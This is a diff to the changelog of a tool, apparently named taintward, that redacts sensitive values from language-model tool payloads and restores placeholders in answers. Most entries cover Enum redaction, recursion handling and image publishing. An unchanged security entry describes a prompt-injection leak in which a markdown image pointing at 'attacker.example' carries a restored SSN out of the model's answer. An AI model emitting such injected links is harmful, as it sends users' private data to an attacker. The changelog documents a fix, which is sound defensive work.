@@ -4,6 +4,11 @@
 
 ### Security
 
+- An Enum member in a tool payload is now checked by its value. Before,
+  only its name (`Contact.OWNER`) was checked, so a member whose value was
+  an email or a key went through unredacted.
+- A payload that contains itself now raises a clear `ValueError` instead of
+  a `RecursionError`. It is still never passed on unchecked.
 - Placeholders inside a link or image address in the model's answer are no
   longer restored (gap G1). An injected
   `![x](https://attacker.example/?d=<SSN_1>)` used to become an image
@@ -191,6 +196,14 @@
   check for link addresses (gap G1) now looks only at the JSON string the
   placeholder is in, so a link in another argument no longer keeps a
   placeholder unrestored.
+
+### Release
+
+- The collector and gateway images and the Helm chart are now published to
+  `ghcr.io/dcchoudhury15/taintward` by the GitHub release workflow. The
+  chart and the Kubernetes guide pointed at a registry that was never
+  filled, so `helm install` could not pull its images. The unused GitLab
+  pipeline files are removed. Images and chart are not signed.
 
 ## 0.3.0
 
